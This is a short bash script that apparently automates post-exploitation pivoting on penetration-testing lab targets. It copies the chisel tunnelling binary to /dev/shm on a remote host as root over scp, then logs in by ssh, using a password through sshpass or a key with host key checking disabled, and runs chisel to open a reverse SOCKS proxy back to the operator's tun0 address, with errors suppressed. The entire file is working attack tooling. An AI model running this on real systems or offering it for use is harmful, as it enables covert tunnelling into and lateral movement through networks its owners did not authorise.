#!/bin/bash

IP=$1
BASE_DIR=$2
IP_TUN0=$(ifconfig tun0 | grep "inet " | cut -d " " -f 10)

if [ $# -eq 0 ]; then
	echo "Usage: portfwd.sh <IP> <BASE_DIR> <optional:password>"
	exit 1
fi

echo "Transfering file to /dev/shm/chisel..."
scp -i $BASE_DIR/id_rsa \
	$BASE_DIR/chisel root@$IP:/dev/shm/chisel 2>/dev/null

echo "Listening on local (PORT 8001)"
./chisel server -p 8001 --reverse | head -n1 2>/dev/null &


echo "Executing the file..."
if [ $3 -ne 0 ];then
	sshpass -p $3 ssh root@$IP "chmod +x /dev/shm/chisel && /dev/shm/chisel client $IP_TUN0:8001 R:1080:socks" 2>/dev/null &
else
	ssh -o StrictHostKeyChecking=no -o BatchMode=Yes -i $BASE_DIR/id_rsa root@$IP "chmod +x /dev/shm/chisel && /dev/shm/chisel client $IP_TUN0:8001 R:1080:socks" 2>/dev/null &
fi
